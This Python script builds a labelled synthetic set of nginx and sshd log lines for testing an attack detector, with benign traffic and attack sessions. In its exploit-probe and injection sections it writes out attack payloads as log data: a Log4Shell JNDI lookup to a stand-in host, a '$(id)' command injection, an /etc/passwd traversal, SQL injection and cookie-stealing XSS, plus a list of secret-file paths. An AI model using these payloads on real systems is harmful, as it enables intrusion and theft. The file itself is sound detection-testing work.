"""Builds the public-server replay set: synthetic nginx access and sshd auth lines, labelled.

Everything is made up. Addresses come only from the documentation ranges (192.0.2.0/24 for
normal visitors and staff, 198.51.100.0/24 and 203.0.113.0/24 for attackers), host names are
fake, and there is no customer data. The shapes follow what a small public Linux server really
logs: nginx "combined" lines, OpenSSH messages in both classic syslog and the ISO-timestamp
format of newer Debian/Ubuntu, and the noise every public server sees (crawlers, uptime
checks, Let's Encrypt, a mistyped URL).

    python eval/realworld/build_replay.py     # writes events.jsonl, nginx_access.log, auth.log here

Labels: every line from an attack session gets that attack's category, including the early
lines a threshold rule cannot flag yet (as the brute-force bursts in eval/events.jsonl are).
The `session` field names the source, so score_replay.py can also score per attacker.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
T0 = datetime(2026, 9, 28, 0, 0, 0, tzinfo=timezone.utc)
WEB_HOST = "www-demo"
SSH_HOST = "srv-demo"

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
]
PAGES = ["/", "/about", "/courses", "/courses/math-p5", "/courses/science-sec2", "/timetable", "/contact",
         "/news/2026-term4", "/fees", "/login"]
ASSETS = ["/static/css/site.css", "/static/js/app.js", "/images/logo.png", "/images/hero.webp", "/static/fonts/inter.woff2"]


class Builder:
    def __init__(self, seed: int = 7) -> None:
        self.rng = random.Random(seed)
        self.rows: list[tuple[datetime, str, dict]] = []  # (time, kind, event)

    # ------------------------------------------------------------------ nginx
    def web(self, t: datetime, ip: str, method: str, path: str, status: int, ua: str, label: str,
            session: str, scenario: str, size: int | None = None, request: str | None = None) -> None:
        size = size if size is not None else (self.rng.randint(150, 40000) if status < 400 else self.rng.randint(150, 600))
        stamp = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        req = request if request is not None else f"{method} {path} HTTP/1.1"
        raw = f'{ip} - - [{stamp}] "{req}" {status} {size} "-" "{ua}"'
        self.rows.append((t, "web", {"layer": "web", "source": "nginx_access", "host": WEB_HOST, "raw": raw,
                                     "label": label, "session": session, "scenario": scenario}))

    # ------------------------------------------------------------------ sshd
    def ssh(self, t: datetime, pid: int, msg: str, label: str, session: str, scenario: str, iso: bool = False) -> None:
        if iso:  # Debian 12 / Ubuntu 24.04 rsyslog default
            stamp = t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.rng.randint(0, 999999):06d}+00:00"
        else:
            stamp = t.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if t.day < 10 else t.strftime("%b %d %H:%M:%S")
        raw = f"{stamp} {SSH_HOST} sshd[{pid}]: {msg}"
        self.rows.append((t, "ssh", {"layer": "os", "source": "sshd", "host": SSH_HOST, "raw": raw,
                                     "label": label, "session": session, "scenario": scenario}))

    def pid(self) -> int:
        return self.rng.randint(10000, 99999)

    # ================================================================= benign web
    def visitors(self, n: int = 40) -> None:
        for v in range(n):
            ip = f"192.0.2.{10 + v}"
            ua = self.rng.choice(BROWSERS)
            t = T0 + timedelta(seconds=self.rng.randint(0, 7000))
            for _ in range(self.rng.randint(3, 9)):
                page = self.rng.choice(PAGES)
                self.web(t, ip, "GET", page, self.rng.choice([200, 200, 200, 304]), ua, "benign", f"visitor-{v}", "visitor")
                for a in self.rng.sample(ASSETS, 3):
                    self.web(t + timedelta(milliseconds=300), ip, "GET", a, self.rng.choice([200, 304]), ua, "benign", f"visitor-{v}", "visitor")
                if self.rng.random() < 0.3:
                    self.web(t + timedelta(seconds=1), ip, "GET", self.rng.choice(["/favicon.ico", "/apple-touch-icon.png",
                             "/apple-touch-icon-precomposed.png"]), 404, ua, "benign", f"visitor-{v}", "visitor")
                t += timedelta(seconds=self.rng.randint(5, 90))
            if v % 7 == 0:  # a mistyped or stale link
                self.web(t, ip, "GET", self.rng.choice(["/coures", "/timetabel", "/news/2024-term1", "/fees.pdf"]), 404,
                         ua, "benign", f"visitor-{v}", "typo")
        # A parent logs in (one typo first), a student with a broken page refreshing a few times.
        ip, ua = "192.0.2.90", BROWSERS[0]
        t = T0 + timedelta(minutes=33)
        self.web(t, ip, "POST", "/login", 401, ua, "benign", "parent-login", "login_typo")
        self.web(t + timedelta(seconds=9), ip, "POST", "/login", 302, ua, "benign", "parent-login", "login_typo")
        self.web(t + timedelta(seconds=10), ip, "GET", "/timetable", 200, ua, "benign", "parent-login", "login_typo")
        ip, ua = "192.0.2.91", BROWSERS[2]
        t = T0 + timedelta(minutes=51)
        for i in range(6):
            self.web(t + timedelta(seconds=4 * i), ip, "GET", "/images/term4-poster.jpg", 404, ua, "benign", "broken-image", "refresh_404")

    def bots_and_monitors(self) -> None:
        # Googlebot re-crawling old URLs: many 404s quickly, must not look like a scan.
        ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        t = T0 + timedelta(minutes=20)
        for i in range(30):
            status = 404 if i % 2 else 200
            path = f"/news/archive/{2019 + i % 5}-{i:02d}" if status == 404 else self.rng.choice(PAGES)
            self.web(t + timedelta(seconds=2 * i), "192.0.2.200", "GET", path, status, ua, "benign", "googlebot", "crawler")
        self.web(t, "192.0.2.200", "GET", "/robots.txt", 200, ua, "benign", "googlebot", "crawler")
        self.web(t, "192.0.2.201", "GET", "/sitemap.xml", 404,
                 "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "benign", "bingbot", "crawler")
        # Uptime check every minute.
        for i in range(0, 120, 1):
            self.web(T0 + timedelta(minutes=i), "192.0.2.210", "HEAD", "/", 200,
                     "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)", "benign", "uptime", "monitor")
        # Let's Encrypt renewal.
        for i, ip in enumerate(["192.0.2.220", "192.0.2.221", "192.0.2.222"]):
            self.web(T0 + timedelta(minutes=70, seconds=i), ip, "GET", "/.well-known/acme-challenge/Xk2f9dQ-demo-token", 200,
                     "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)", "benign", "acme", "acme")
        # Link previews and an RSS reader.
        self.web(T0 + timedelta(minutes=44), "192.0.2.230", "GET", "/news/2026-term4", 200,
                 "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", "benign", "preview", "preview")
        self.web(T0 + timedelta(minutes=45), "192.0.2.231", "GET", "/.well-known/security.txt", 404,
                 BROWSERS[3], "benign", "sec-txt", "researcher_courtesy")

    # ================================================================= web attacks
    def env_git_scanner(self) -> None:
        ip, ua = "198.51.100.10", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0"
        paths = ["/.env", "/.env.bak", "/.env.production", "/api/.env", "/laravel/.env", "/.git/config", "/.git/HEAD",
                 "/.aws/credentials", "/config.json", "/.DS_Store", "/backup.sql", "/db.sql", "/dump.sql", "/wp-config.php.bak",
                 "/phpinfo.php", "/info.php", "/.vscode/sftp.json", "/.svn/entries", "/.htpasswd", "/server-status"]
        t = T0 + timedelta(minutes=12)
        for i, p in enumerate(paths):
            self.web(t + timedelta(seconds=i), ip, "GET", p, 403 if p == "/server-status" else 404, ua,
                     "port_scan", "env-scanner", "secret_file_probe")

    def wordpress_scanner(self) -> None:
        ip, ua = "198.51.100.11", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
        paths = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-includes/wlwmanifest.xml", "/blog/wp-includes/wlwmanifest.xml",
                 "/wordpress/wp-admin/setup-config.php", "/wp/wp-admin/install.php", "/wp-content/plugins/revslider/readme.txt"]
        t = T0 + timedelta(minutes=27)
        for i, p in enumerate(paths):
            self.web(t + timedelta(seconds=3 * i), ip, "GET", p, 404, ua, "port_scan", "wp-scanner", "cms_probe")
        for i in range(4):
            self.web(t + timedelta(seconds=40 + i), ip, "POST", "/xmlrpc.php", 404, ua, "port_scan", "wp-scanner", "cms_probe")

    def dir_bruteforcer(self) -> None:
        # No signature at all on most lines: only the burst of 404s gives it away.
        ip, ua = "198.51.100.12", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
        words = ["admin", "backup", "old", "test", "dev", "staging", "api/v2", "private", "upload", "uploads", "tmp", "files",
                 "export.php", "admin/export", "data", "archive", "portal", "manage", "panel", "system", "secret", "internal",
                 "debug", "logs", "db", "sql", "beta", "v1", "console-old", "cp"]
        t = T0 + timedelta(minutes=58)
        for i, w in enumerate(words):
            self.web(t + timedelta(milliseconds=700 * i), ip, "GET", f"/{w}", 404, ua, "port_scan", "dirbuster", "path_bruteforce")

    def tool_scanners(self) -> None:
        t = T0 + timedelta(minutes=5)
        self.web(t, "198.51.100.13", "GET", "/", 200, "Mozilla/5.0 zgrab/0.x", "port_scan", "zgrab", "scanner_ua")
        self.web(t + timedelta(seconds=1), "198.51.100.13", "", "", 400, "-", "port_scan", "zgrab", "tls_on_http",
                 request="\\x16\\x03\\x01\\x00\\xA5\\x01\\x00\\x00\\xA1\\x03\\x03")
        self.web(t + timedelta(minutes=9), "198.51.100.14", "GET", "/", 200,
                 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", "port_scan", "censys", "scanner_ua")
        nuclei = "Mozilla/5.0 (Windows NT 10.0) Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
        for i, p in enumerate(["/", "/.git/config", "/actuator/env", "/solr/admin/info/system", "/api/v1/pods"]):
            self.web(t + timedelta(minutes=15, seconds=i), "198.51.100.15", "GET", p, 404 if i else 200, nuclei,
                     "port_scan", "nuclei", "scanner_ua")
        for i, p in enumerate(["/", "/admin/", "/cgi-bin/test.cgi"]):
            self.web(t + timedelta(minutes=16, seconds=i), "198.51.100.16", "GET", p, 404 if i else 200,
                     "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)", "port_scan", "nikto", "scanner_ua")

    def exploit_probes(self) -> None:
        t = T0 + timedelta(minutes=40)
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        self.web(t, "198.51.100.20", "GET", "/?x=${jndi:ldap://198.51.100.99:1389/a}", 200,
                 "${jndi:ldap://198.51.100.99:1389/a}", "port_scan", "log4shell", "exploit_probe")
        self.web(t + timedelta(minutes=3), "198.51.100.21", "POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 404,
                 ua, "port_scan", "phpunit-rce", "exploit_probe")
        self.web(t + timedelta(minutes=4), "198.51.100.22", "POST", "/boaform/admin/formLogin", 404, ua, "port_scan", "router-bot", "exploit_probe")
        self.web(t + timedelta(minutes=4, seconds=2), "198.51.100.22", "GET",
                 "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", 404, ua, "port_scan", "router-bot", "exploit_probe")
        self.web(t + timedelta(minutes=6), "198.51.100.23", "GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21",
                 404, ua, "port_scan", "thinkphp", "exploit_probe")
        self.web(t + timedelta(minutes=7), "198.51.100.24", "GET", "/../../../../etc/passwd", 400, ua, "port_scan", "traversal", "exploit_probe")
        self.web(t + timedelta(minutes=8), "198.51.100.25", "GET", "http://example.com/", 400, ua, "port_scan", "proxy-check", "proxy_probe",
                 request="GET http://example.com/ HTTP/1.1")
        self.web(t + timedelta(minutes=8, seconds=1), "198.51.100.25", "CONNECT", "example.com:443", 400, ua, "port_scan",
                 "proxy-check", "proxy_probe", request="CONNECT example.com:443 HTTP/1.1")

    def injection(self) -> None:
        t = T0 + timedelta(minutes=66)
        sqlmap = "sqlmap/1.8.3#stable (https://sqlmap.org)"
        for i, q in enumerate(["id=1", "id=1%20AND%201%3D1", "id=1%27%20AND%20SLEEP(5)--%20-", "id=1%20UNION%20ALL%20SELECT%20NULL,NULL--%20-"]):
            self.web(t + timedelta(seconds=2 * i), "203.0.113.30", "GET", f"/courses?{q}", 200, sqlmap, "sql_injection", "sqlmap", "sqli_tool")
        ua = BROWSERS[3]
        self.web(t + timedelta(minutes=2), "203.0.113.31", "GET", "/courses?id=1'%20OR%20'1'='1", 200, ua, "sql_injection", "manual-sqli", "sqli")
        self.web(t + timedelta(minutes=3), "203.0.113.32", "GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200,
                 ua, "xss", "manual-xss", "xss")

    def web_login_bruteforce(self) -> None:
        ip, ua = "203.0.113.20", "python-requests/2.32.3"
        t = T0 + timedelta(minutes=80)
        for i in range(25):
            self.web(t + timedelta(seconds=2 * i), ip, "POST", "/login", 401, ua, "brute_force", "web-login-bf", "login_bruteforce")

    # ================================================================= ssh
    def ssh_benign(self) -> None:
        t = T0 + timedelta(minutes=2)
        self.ssh(t, 812, "Server listening on 0.0.0.0 port 22.", "benign", "sshd-daemon", "daemon")
        self.ssh(t, 812, "Server listening on :: port 22.", "benign", "sshd-daemon", "daemon")
        # The admin, several sessions (key), once a password typo on a jump box.
        for k in range(5):
            s = T0 + timedelta(minutes=10 + 25 * k)
            pid, port = self.pid(), 50000 + k
            self.ssh(s, pid, f"Accepted publickey for opsadmin from 192.0.2.5 port {port} ssh2: ED25519 SHA256:demoKeyFingerprint0000000000000000000", "benign", "admin", "admin_login")
            self.ssh(s, pid, "pam_unix(sshd:session): session opened for user opsadmin(uid=1000) by opsadmin(uid=0)", "benign", "admin", "admin_login")
            e = s + timedelta(minutes=self.rng.randint(3, 20))
            self.ssh(e, pid, f"Received disconnect from 192.0.2.5 port {port}:11: disconnected by user", "benign", "admin", "admin_login")
            self.ssh(e, pid, f"Disconnected from user opsadmin 192.0.2.5 port {port}", "benign", "admin", "admin_login")
            self.ssh(e, pid, "pam_unix(sshd:session): session closed for user opsadmin", "benign", "admin", "admin_login")
        s = T0 + timedelta(minutes=47)
        pid = self.pid()
        self.ssh(s, pid, "Failed password for teacher1 from 192.0.2.6 port 51515 ssh2", "benign", "teacher-typo", "password_typo", iso=True)
        self.ssh(s, pid, "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.0.2.6  user=teacher1", "benign", "teacher-typo", "password_typo", iso=True)
        self.ssh(s + timedelta(seconds=6), pid, "Accepted password for teacher1 from 192.0.2.6 port 51515 ssh2", "benign", "teacher-typo", "password_typo", iso=True)
        # CI deploys every 10 minutes.
        for k in range(12):
            s = T0 + timedelta(minutes=10 * k + 3)
            pid = self.pid()
            self.ssh(s, pid, f"Accepted publickey for deploy from 192.0.2.40 port {52000 + k} ssh2: ED25519 SHA256:ciKeyFingerprint000000000000000000000", "benign", "ci-deploy", "deploy", iso=True)
            self.ssh(s + timedelta(seconds=20), pid, f"Disconnected from user deploy 192.0.2.40 port {52000 + k}", "benign", "ci-deploy", "deploy", iso=True)

    def ssh_root_password_bf(self) -> None:
        ip = "203.0.113.50"
        t = T0 + timedelta(minutes=15)
        for i in range(30):
            pid, port = self.pid(), 40000 + i
            s = t + timedelta(seconds=self.rng.randint(3, 8) * i)
            self.ssh(s, pid, f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user=root", "brute_force", "ssh-root-bf", "password_bruteforce")
            self.ssh(s + timedelta(seconds=2), pid, f"Failed password for root from {ip} port {port} ssh2", "brute_force", "ssh-root-bf", "password_bruteforce")
            self.ssh(s + timedelta(seconds=2), pid, f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]", "brute_force", "ssh-root-bf", "password_bruteforce")
            self.ssh(s + timedelta(seconds=2), pid, f"Disconnected from authenticating user root {ip} port {port} [preauth]", "brute_force", "ssh-root-bf", "password_bruteforce")

    def ssh_invalid_user_dictionary(self) -> None:
        # The pattern seen on the real server: "Invalid user X from IP".
        ip = "203.0.113.51"
        users = ["admin", "test", "oracle", "ubuntu", "postgres", "user", "git", "ftpuser", "guest", "support", "deploy1", "minecraft",
                 "jenkins", "hadoop", "pi", "debian", "centos", "mysql", "tomcat", "www"]
        t = T0 + timedelta(minutes=62)
        for i, u in enumerate(users):
            pid, port = self.pid(), 41000 + i
            s = t + timedelta(seconds=11 * i)
            self.ssh(s, pid, f"Invalid user {u} from {ip} port {port}", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)
            self.ssh(s, pid, "pam_unix(sshd:auth): check pass; user unknown", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)
            self.ssh(s, pid, f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)
            self.ssh(s + timedelta(seconds=2), pid, f"Failed password for invalid user {u} from {ip} port {port} ssh2", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)
            self.ssh(s + timedelta(seconds=2), pid, f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)
            self.ssh(s + timedelta(seconds=2), pid, f"Disconnected from invalid user {u} {ip} port {port} [preauth]", "brute_force", "ssh-dict", "invalid_user_dictionary", iso=True)

    def ssh_key_only_attempts(self) -> None:
        # With PasswordAuthentication no, bots never get to "Failed password".
        t = T0 + timedelta(minutes=90)
        for i, u in enumerate(["admin", "test", "user", "ubuntu", "oracle", "git", "postgres", "ftp"]):
            pid, port = self.pid(), 42000 + i
            s = t + timedelta(seconds=7 * i)
            self.ssh(s, pid, f"Invalid user {u} from 203.0.113.52 port {port}", "brute_force", "ssh-keyonly-invalid", "key_only_server")
            self.ssh(s + timedelta(seconds=1), pid, f"Connection closed by invalid user {u} 203.0.113.52 port {port} [preauth]", "brute_force", "ssh-keyonly-invalid", "key_only_server")
        for i in range(8):
            pid, port = self.pid(), 43000 + i
            self.ssh(t + timedelta(minutes=5, seconds=9 * i), pid, f"Connection closed by authenticating user root 203.0.113.53 port {port} [preauth]",
                     "brute_force", "ssh-keyonly-root", "key_only_server")

    def ssh_slow_bruteforce(self) -> None:
        # One guess every 5 minutes: under the 5-in-10-minutes threshold. A known miss.
        for i in range(12):
            s = T0 + timedelta(minutes=5 * i + 1)
            self.ssh(s, self.pid(), f"Failed password for root from 203.0.113.54 port {44000 + i} ssh2", "brute_force", "ssh-slow-bf", "slow_bruteforce")

    def ssh_compromise(self) -> None:
        ip = "203.0.113.55"
        t = T0 + timedelta(minutes=100)
        for i in range(7):
            s = t + timedelta(seconds=5 * i)
            self.ssh(s, self.pid(), f"Failed password for deploy from {ip} port {45000 + i} ssh2", "brute_force", "ssh-compromise", "guessed_password")
        s = t + timedelta(seconds=40)
        pid = self.pid()
        self.ssh(s, pid, f"Accepted password for deploy from {ip} port 45007 ssh2", "brute_force", "ssh-compromise", "guessed_password")
        self.ssh(s, pid, "pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)", "brute_force", "ssh-compromise", "guessed_password")

    def ssh_scanners(self) -> None:
        # Banner grabbers: a few lines each, never a login attempt.
        t = T0 + timedelta(minutes=8)
        msgs = [
            "Did not receive identification string from {ip} port {port}",
            "banner exchange: Connection from {ip} port {port}: invalid format",
            "Unable to negotiate with {ip} port {port}: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 [preauth]",
            "Connection closed by {ip} port {port} [preauth]",
        ]
        for k, n in enumerate([4, 3, 1, 2, 5]):
            ip = f"198.51.100.{60 + k}"
            for i in range(n):
                self.ssh(t + timedelta(minutes=17 * k, seconds=20 * i), self.pid(), msgs[(k + i) % 4].format(ip=ip, port=46000 + i),
                         "port_scan", f"ssh-scanner-{k}", "banner_grab", iso=bool(k % 2))

    # ================================================================= output
    def build(self) -> list[dict]:
        for step in (self.visitors, self.bots_and_monitors, self.env_git_scanner, self.wordpress_scanner, self.dir_bruteforcer,
                     self.tool_scanners, self.exploit_probes, self.injection, self.web_login_bruteforce, self.ssh_benign,
                     self.ssh_root_password_bf, self.ssh_invalid_user_dictionary, self.ssh_key_only_attempts,
                     self.ssh_slow_bruteforce, self.ssh_compromise, self.ssh_scanners):
            step()
        self.rows.sort(key=lambda r: r[0])
        out = []
        for n, (t, kind, ev) in enumerate(self.rows, 1):
            out.append({"event_id": f"rw-{n:04d}", "timestamp": t.isoformat(timespec="seconds"), "host": ev["host"],
                        "layer": ev["layer"], "source": ev["source"], "src_ip": None, "user": None, "raw": ev["raw"],
                        "asset_criticality": 1.0, "label": ev["label"], "origin": kind, "session": ev["session"],
                        "scenario": ev["scenario"]})
        return out


def main() -> None:
    events = Builder().build()
    with (HERE / "events.jsonl").open("w", encoding="utf-8", newline="\n") as fh:
        for ev in events:
            fh.write(json.dumps(ev) + "\n")
    (HERE / "nginx_access.log").write_text("".join(e["raw"] + "\n" for e in events if e["origin"] == "web"), encoding="utf-8")
    (HERE / "auth.log").write_text("".join(e["raw"] + "\n" for e in events if e["origin"] == "ssh"), encoding="utf-8")
    counts: dict[str, int] = {}
    for e in events:
        counts[e["label"]] = counts.get(e["label"], 0) + 1
    print(f"{len(events)} events: {counts}")


if __name__ == "__main__":
    main()
